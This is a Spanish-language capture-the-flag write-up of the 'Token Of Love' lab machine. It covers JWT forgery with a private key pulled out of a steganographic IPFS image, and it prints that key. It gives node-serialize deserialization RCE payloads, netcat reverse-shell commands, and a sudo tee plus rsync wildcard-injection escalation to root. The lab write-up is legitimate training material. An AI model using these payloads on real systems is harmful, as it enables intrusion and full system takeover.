---
author: Lenam
pubDatetime: 2025-02-20T15:22:00Z
title: WriteUp Token Of Love - TheHackersLabs
slug: token-of-love-writeup-thehackerslabs-es
featured: false
draft: false
ogImage: "../../../assets/images/token-of-love/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - node serialization
  - rsync wildcard
  - sudo
description:
  Writeup que narra la vulneración en "Token Of Love", se descifra una pista oculta en IPFS para obtener la clave privada y manipular el JWT, se explotan vulnerabilidades en Node.js para conseguir RCE y, usando sudo con tee y una vulnerabilidad en rsync wildcards, se escala hasta root.
lang: es
---

![Rabbit in Matrix](../../../assets/images/token-of-love/OpenGraph.png)

Writeup que narra con amor la travesía hacker en "Token Of Love", se descifra una pista oculta en IPFS para obtener la clave privada y manipular el JWT, se explotan vulnerabilidades en Node.js para ejecutar código remoto y, con un tierno truco usando sudo con tee y una vulnerabilidad en rsync wildcards, se escala con cariño hasta lograr privilegios root.

![alt text](../../../assets/images/token-of-love/image.png)

## Tabla de contenido

## Enumeración automática

Escaneando los puertos abiertos.

```bash
$ nmap -p- -Pn -n 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:04 CET
Nmap scan report for 192.168.1.179
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Encontramos los puertos 80 y 22, escaneamos estos dos puertos para obtener más información.

```bash
$ nmap -p22,80 -Pn -n -sVC 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:05 CET
Nmap scan report for 192.168.1.179
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 f21345975282db77a38c7c243651e2c9 (ECDSA)
|_  256 4b3ef2d3c4f6becd04fff1a11fa563d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Token Of Love - Inicia Sesi\xC3\xB3n
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Intentamos obtener más información sobre el sitio web del puerto 80 con `whatweb`.

```bash
$ whatweb http://192.168.1.179
http://192.168.1.179 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.1.179], PasswordField[password], Title[Token Of Love - Inicia Sesión], X-Powered-By[Express]
```

También realizamos fuzzing del sitio web para obtener más información.

Con `dirb` ...

```bash
$ dirb http://192.168.1.179

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 20:12:17 2025
URL_BASE: http://192.168.1.179/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.179/ ----
+ http://192.168.1.179/css (CODE:301|SIZE:153)                                                      
+ http://192.168.1.179/images (CODE:301|SIZE:156)                                                   
+ http://192.168.1.179/logout (CODE:302|SIZE:23)                                                    
+ http://192.168.1.179/messages (CODE:403|SIZE:22)                                                  
+ http://192.168.1.179/private (CODE:403|SIZE:22)                                                   
+ http://192.168.1.179/register (CODE:200|SIZE:8121)                                                
+ http://192.168.1.179/server-status (CODE:403|SIZE:278)                                            
                                                                                                    
-----------------
END_TIME: Sun Feb 23 20:13:20 2025
DOWNLOADED: 4612 - FOUND: 7

```

... y con `gobuster`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.179 -x .php,.txt,.zip,.db,.htm,.html -t 40 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.179
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              htm,html,php,txt,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 156] [--> /images/]
/register             (Status: 200) [Size: 8125]
/css                  (Status: 301) [Size: 153] [--> /css/]
/messages             (Status: 403) [Size: 22]
/private              (Status: 403) [Size: 22]
/logout               (Status: 302) [Size: 23] [--> /]
/Register             (Status: 200) [Size: 8124]
/Private              (Status: 403) [Size: 22]
/Logout               (Status: 302) [Size: 23] [--> /]
/Messages             (Status: 403) [Size: 22]
/server-status        (Status: 403) [Size: 278]
```

## Enumeración manual

![alt text](../../../assets/images/token-of-love/image-1.png)

Entramos al sitio web del puerto 80, nos registramos e iniciamos sesión, miramos el código fuente después de iniciar sesión y las cookies, parece ser una cookie de sesión JWT.

En el código javascript de la página, podemos encontrar varias pistas.

```html
<script>
    // Función para obtener mensajes desde el servidor y renderizarlos de forma segura
    function loadMessages() {
      fetch('/messages')
        .then(response => response.json())
        .then(data => {
          const messagesDiv = document.getElementById('messages');
          messagesDiv.innerHTML = '';
          data.messages.forEach(msg => {
            const div = document.createElement('div');
            div.className = 'message';
            
            // Crear un elemento para el remitente y establecer el texto usando textContent para evitar inyección HTML
            const senderEl = document.createElement('strong');
            senderEl.textContent = msg.sender;
            div.appendChild(senderEl);
            
            // Agregar información de la fecha y hora
            const timestampText = document.createTextNode(" (" + new Date(msg.timestamp).toLocaleString() + "): ");
            div.appendChild(timestampText);
            
            // Crear un nodo de texto para el mensaje, asegurando que se escape cualquier carácter HTML
            const messageText = document.createTextNode(msg.text);
            div.appendChild(messageText);
            
            messagesDiv.appendChild(div);
          });
        })
        .catch(error => console.error('Error al cargar mensajes:', error));
    }

    // Cargar mensajes al iniciar la página
    loadMessages();
    /**

    .-./`) .-------.  ________    .-'''-.  
    \ .-.')\  _(`)_ \|        |  / _     \ 
    / `-' \| (_ o._)||   .----' (`' )/`--' 
    `-'`"`|  (_,_) /|  _|____ (_ o _).    
    .---. |   '-.-' |_( )_   | (_,_). '.  
    |   | |   |     (_ o._)__|.---.  \  : 
    |   | |   |     |(_,_)    \    `-'  | 
    |   | /   )     |   |      \       /  
    '---' `---'     '---'       `-...-'   

    Busca el conejo hacker amoroso en un mundo interplanetario !

    **/
    // Solo los usuarios admin pueden enviar mensajes
    
</script>
```

Cookie de session `token`, tiene activado el HttpOnly.

![alt text](../../../assets/images/token-of-love/image-2.png)

El JWT de la cookie lo podemos decodificar para ver su contenido y el algoritmo que utiliza.

![alt text](../../../assets/images/token-of-love/image-3.png)

Para decodificar el token JWT que se encuentra en la cookie utilizamos el sitio web https://10015.io/tools/jwt-encoder-decode.

Vemos que la cookie utiliza algoritmo asimétrico RS256, por lo que seguramente hay clave privada y publica. Con la clave privada se firman los token y con la clave publica se validan los token firmados.

Las aplicaciones que utilizan sistemas de firma asimétrica para JWT suelen exponer las claves publicas para que los clientes puedan comprobar la firma del servidor, estas se suelen exponer en el endpoint `/.well-known/jwks.json` por norma general, miramos si existe ese endpoint y nos devuelve la clave publica en formato JSON.

```bash
$ curl http://192.168.1.179/.well-known/jwks.json | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   420  100   420    0     0  93645      0 --:--:-- --:--:-- --:--:--  102k
{
  "keys": [
    {
      "kty": "RSA",
      "n": "qvf2RrttWEl-3JydhNL9sOmnRrjIQKTJgUnuAyyhqUQF0GbcMtlLJakWVLdb23n5rwW6AvX9dXHzG4Fmj7bqy8GEKP6i3_GzZzEMMOtzF7BQFJnIH9uC0hIvn2ha---iEf9flPFO-qEjlm7qLhmoRhlre-D8Hb_8V5qm2VDcV2Tna8Q4IsYVf1IqVpMZ3seBkaYRXuCgXE_9ItagHYMaYA0G41Y-YPppnHjqUp3NYG7K7bBI4G1krwxAFqZTZUZQIlBdJ6ej6oKVCzrsUUzB5Y-BnW-2Hx6fDM-ik4ChNfpKOL7rLyqvvVKnIMlB1vFQplr4RWeonnUSdAMs5vj9Vw",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig",
      "kid": "1"
    }
  ]
}
```

Si intentamos manipular el JWT no podremos porque la programación esta bien echa (o eso creo). Solo acepta JWT firmados con la clave privada y no se puede jugar a las diferentes técnicas de portswigger, la intención es aprender que es un JWT y el funcionamiento de claves asimétricas.

En resumen, necesitamos la clave privada de esta aplicación para poder manipular el JWT y en el código fuente hay una pista muy importante **IPFS** (`InterPlanetary File System`), y en los mensajes del administrador hay más pistas y lo que parece ser un hash.

![alt text](../../../assets/images/token-of-love/image-4.png)

```text
administrador (15/2/2025, 23:50:11): Dicen que las claves viajan por rutas interplanetarias, vagando por el espacio infinito y estando en todas partes a la vez… ¿será magia o pura tecnología? 😉🔮 bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
```

Utilizamos un GateWay HTTP para IPFS, podemos obtener uno de la siguiente lista:

https://ipfs.github.io/public-gateway-checker/

Solo tenemos que añadir el hash del recurso IPFS en la URL del GateWay seleccionado.

```bash
$ wget https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu                          
--2025-02-16 00:04:33--  https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
Resolviendo ipfs.io (ipfs.io)... 2602:fea2:2::1, 209.94.90.1
Conectando con ipfs.io (ipfs.io)[2602:fea2:2::1]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1025464 (1001K) [image/webp]
Grabando a: «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu»

bafybeicbqiitqxhqx47qenneilg 100%[==============================================>]   1001K  --.-KB/s    en 0,1s    

2025-02-16 00:04:33 (8,30 MB/s) - «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu» guardado [1025464/1025464]

$ ls    
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu

$ file bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu 
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu: RIFF (little-endian) data, Web/P image

$ mv bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu file.webp

```

Comprobamos el fichero y parece ser una imagen `WEBP`, modificamos el fichero para más facilidad y lo abrimos para ver la imagen.

![alt text](../../../assets/images/token-of-love/image-5.png)

Es el mismo conejo que aparece en la página de login y de registro, comprobamos las diferencias y es todo igual pero no.

```bash
$ diff hacker.webp file.webp  
Los archivos binarios hacker.webp y file.webp son distintos
```

Parece que el fichero descargado de `IPFS` contiene algo, `steghide` no acepta fichero `WEBP`, a si que utilizamos `imgconceal`.

https://github.com/tbpaolini/imgconceal

```bash
$ wget https://github.com/tbpaolini/imgconceal/releases/download/v1.0.4/imgconceal
$ chmod +x imgconceal
$ ./imgconceal -e file.webp       
Input password for the hidden file (may be blank)
Password: 
Scanning cover image for suitable carrier bits... Done!  
SUCCESS: extracted 'private.key' from 'file.webp'.
  hidden on: Thu Feb 13 18:49:04 2025
$ cat private.key    
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCq9/ZGu21YSX7c
nJ2E0v2w6adGuMhApMmBSe4DLKGpRAXQZtwy2UslqRZUt1vbefmvBboC9f11cfMb
gWaPturLwYQo/qLf8bNnMQww63MXsFAUmcgf24LSEi+faFr776IR/1+U8U76oSOW
buouGahGGWt74Pwdv/xXmqbZUNxXZOdrxDgixhV/UipWkxnex4GRphFe4KBcT/0i
1qAdgxpgDQbjVj5g+mmceOpSnc1gbsrtsEjgbWSvDEAWplNlRlAiUF0np6PqgpUL
OuxRTMHlj4Gdb7YfHp8Mz6KTgKE1+ko4vusvKq+9UqcgyUHW8VCmWvhFZ6iedRJ0
Ayzm+P1XAgMBAAECggEASm8HMTdDfUcOLNUgvSWw3ndzZNZpFL/JnPjHX2lsfomH
cHp/zsGMtno9pydnHhAmNN1s5QIc1aeFHIoDUXllEs2PENv/pDkSDtCrSpcPdhZE
XxuupbQHahcR1bh0uC/VozlH70v5wyMpn8JtQSHZgZ9qjLXgfcFKhwdlMcLDE2a7
2S5xac3OCQSD6Dak0pwTcnjUiQb43H6sR9d6DY6eMBTrCH+nJdHh3vOathhIzlj7
uDPYc5o5E6Ui6JJmrRt5H4FSAIzati3qw3+eE9hRbYqNJtYnQcxWXSY2HbLX8ooh
LUcAGm23+RSy7cBfdIQUSjWROqk6oE9XZaP6JE3YaQKBgQDegPsKL+6jBH16LKo3
vSm1vVh0aq87yv2zhTPNMctM30hOKzQqfNOt4yJQ5j86hEqMr1iHrgXOMRmxZAHt
Y330s50nva2aV2DekY6KZHk2prUfwMYp+UjAGL5ehRJ3goI5eD+Eo8+NIwk4hecM
kxnaBktuXjvhHaI5VZOTxr57GQKBgQDEtODMSu3OsqtDmQVyMjBiR5W1l8dp9vn3
jRo2uRc2EEKh2rOQxFJy4UYcg8O5Ekp0irD8jr7GGrHgTF+9o3u0k37h8AOZdR94
Yj5UGo3hkYzcSyAmg+5IauLNATXKAkMsF1VwRDLp34PWL3BDcS63LF6f+iSl9vYR
FVNlWoe57wKBgDxqYz/R4gcrmfKJnDKET4YEgrchnLEsnhSXr4gg5CXcXuKywnhi
6otFqDS1QCfgcemfVveIXhUtqd9L22Yc5L+D4cE/tJq67ReiCEU1oOAhBf84NdaB
1KosTcyWb3w52KhIKV8Xp6yX/dH2MdVtP9C+cs7mEXY/uKO+w9KVXXVJAoGAfMSC
BfLM7htz+Dd6NdnRyLTBJ+Ky0Oqf2L4+T1GNgHRF32XaGcv8w/NRxkppfd01LsC9
zCQ6q2tJQg0PeTjWAU7A30ye69pXcMNX537EWbw5jY11QhjSrkplu0S2OoC+3Juc
TM5lQOTOOa/zVEPZLsRM7Mn8Luz7XRCayiHnDy8CgYBsSiu45tsvRRKmMNY4Gxb5
6s2rgGPKbDxmXc4s5xqAqNi6MmFxcZQGkmw8Unzd1QB9HeFGlJGuqIeIj5kRLepL
4mKP3UvXUZGHWIl4MNSoqPh8u1Sq2P4W/K+NOlKTXnmrvldF+VxYaRTdqQ46+h3k
PkDtOtToiExm8jdJZ5lNdw==
-----END PRIVATE KEY-----
```

Obtenemos una clave privada que se utiliza para firmar el token JWT, ahora podemos manipularlo. Podemos comprobar que esta clave privada pertenece a la clave pública encontrada en `/.well-known/jwks.json`, antes tendremos que transformarla. También podemos volver a crear la clave pública a partir de la clave privada. En definitiva podemos hacer varias pruebas para comprobar que esta clave privada pertenece a la aplicación expuesta en el puerto 80, pero no será necesario.

## Intrusión

Volvemos a https://10015.io/tools/jwt-encoder-decoder y utilizamos la clave privada para firmar el JWT.

![alt text](../../../assets/images/token-of-love/image-6.png)

Copiamos el JWT firmado con la clave privada, entramos con nuestro usuario en la aplicación y modificamos la cookie token por el token JWT modificado con el role a "admin", actualizamos el navegador y ya somos usuario administrador y podemos enviar mensajes.

![alt text](../../../assets/images/token-of-love/image-7.png)

En este punto al tener la clave privada nos podríamos hacer pasar por cualquier usuario registrado o incluso por el propio servidor, pero con esto es suficiente.

Ahora hay más javascript, el que envía el mensaje a la API.

```javascript
// Solo los usuarios admin pueden enviar mensajes
    document.getElementById('messageForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const messageTextValue = document.getElementById('messageText').value;
        // Crear objeto del mensaje
        const message = { text: messageTextValue };
        // Serializar el objeto utilizando JSON.stringify; node-serialize deserializará en el servidor
        const serializedMessage = JSON.stringify(message);

        fetch('/messages', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data: serializedMessage })
        })
        .then(response => response.json())
        .then(data => {
          if(data.message) {
            alert(data.message);
            document.getElementById('messageText').value = '';
            loadMessages();
          } else {
            alert('Error al enviar mensaje');
          }
        })
        .catch(error => {
          console.error('Error al enviar mensaje:', error);
          alert('Error al enviar mensaje');
        });
      });
```

Por otro lado observando las cabeceras de la respuesta que obtuvimos al principio con `whatweb` o mediante las herramientas de desarrollador del propio navegador, y podemos ver que el backend es una aplicación con Express, framework de Node.js.

![alt text](../../../assets/images/token-of-love/image-8.png)

Ademas hay un mensaje muy subjetivo en la web:

```text
Serializa tu mensaje y envíalo con cariño.
```

Utilizamos Burp Suite y capturamos el envío de un mensaje y lo enviamos al repeater.

Modificamos la data enviada por el siguiente payload:

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('wget 192.168.1.116', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```

Envía un JSON con el parámetro `data` donde dentro parece enviar otro json, que en realidad es un objeto javascript que deserializa en el servidor, conseguimos RCE.

![alt text](../../../assets/images/token-of-love/image-9.png)

Más información sobre esta técnica:

- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- https://hacktricks.boitatech.com.br/pentesting-web/deserialization#node-serialize
- https://www.exploit-db.com/exploits/45265
- https://www.exploit-db.com/exploits/49552
- https://www.exploit-db.com/exploits/50036

Nos ponemos a la espera de un revshell con netcat en el puerto 12345 

```bash
nc -lvnp 12345
```

y enviamos el siguiente payload mediante burp suite.

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('nc -c bash 192.168.1.116 12345', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```

Obtenemos una shell como el usuario `cupido`.

![alt text](../../../assets/images/token-of-love/image-10.png)

## Escalada privilegios

Tratamos la terminal para trabajar mejor. Vemos que el usuario `cupido` puede ejecutar `tee` como el usuario eros sin contraseña.

```bash
cupido@tokenoflove:~/tokenoflove$ sudo -l
Matching Defaults entries for cupido on tokenoflove:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cupido may run the following commands on tokenoflove:
    (eros) NOPASSWD: /usr/bin/tee
```

Que según gtfobins tenemos privilegios para escribir ficheros como el usuario `eros`. 

![alt text](../../../assets/images/token-of-love/image-11.png)

Si intentamos crear una clave SSH para el usuario `eros` no servirá de nada, ya que el servicio SSH solo esta accesible para el usuario root.

```bash
cupido@tokenoflove:~/tokenoflove$ cat /etc/ssh/sshd_config
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy use...
...
...

AllowUsers root
```

Por otro lado si observamos los procesos que se ejecutan como root con `pspy64` nos lo enviamos al servidor y lo ejecutamos, esperamos un minuto y encontramos el siguiente proceso.

![alt text](../../../assets/images/token-of-love/image-12.png)

Vemos que hay un proceso que mediante rsync copia todo el home del usuario `eros`, tal como esta hecho es vulnerable a rsync wildcards (https://www.exploit-db.com/papers/33930)

Básicamente lo que nos interesa es esto:

```
CMD: UID=0     PID=2888   | /bin/sh -c bash -c "cd /home/eros && rsync -i /root/.ssh/id_ed25519 -t *.txt tokenoflove:/root/copyhome-eros" > /dev/null 2>&1
CMD: UID=0     PID=2890   | rsync -i /root/.ssh/id_ed25519 -t nota2.txt nota3.txt nota.txt tokenoflove:/root/copyhome-eros 
```

Seguimos con el usuario `cupido`, podemos escribir con sudo ficheros como el usuario `eros`, y ademas tenemos una posible vulnerabilidad de rsync wildcard. Combinamos las dos cosas para crear los siguientes ficheros y acceder directamente a `root`.

```bash
cupido@tokenoflove:~$ echo "nc -c bash 192.168.1.116 443" | sudo -u eros /usr/bin/tee /home/eros/shell.txt
nc -c bash 192.168.1.116 443
cupido@tokenoflove:~$ echo "" | sudo -u eros /usr/bin/tee /home/eros/'-e sh shell.txt'
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.179] 41722
id
uid=0(root) gid=0(root) grupos=0(root)
```

![alt text](../../../assets/images/token-of-love/image-13.png)

Esperamos un minuto máximo y obtenemos shell como root.
